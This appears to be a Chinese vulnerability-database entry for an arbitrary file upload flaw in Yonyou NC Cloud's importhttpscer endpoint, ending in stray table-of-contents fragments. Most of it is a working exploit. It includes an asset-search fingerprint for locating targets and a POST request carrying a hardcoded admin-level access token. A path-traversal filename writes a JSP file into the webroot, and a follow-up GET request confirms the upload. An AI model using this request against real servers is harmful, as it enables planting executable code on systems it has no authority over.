# 用友NCcloudimporthttpscer存在任意文件上传

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 245`　`Content-Type: multipart/form-data; boundary=uof6bcdvrhdkozsvbs3p`　`accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA`

**请求体 / payload**
```
--uof6bcdvrhdkozsvbs3p
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/xsxo0es0ip.jsp"
<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--uof6bcdvrhdkozsvbs3p--

上传文件位置
GET /xsxo0es0ip.jsp HTTP/1.1
Host: {hostname}

nuclei脚本\
\[用友-nc-cloud-importhttpscer-任意文件上传.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC cloud importhttpscer 存在任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud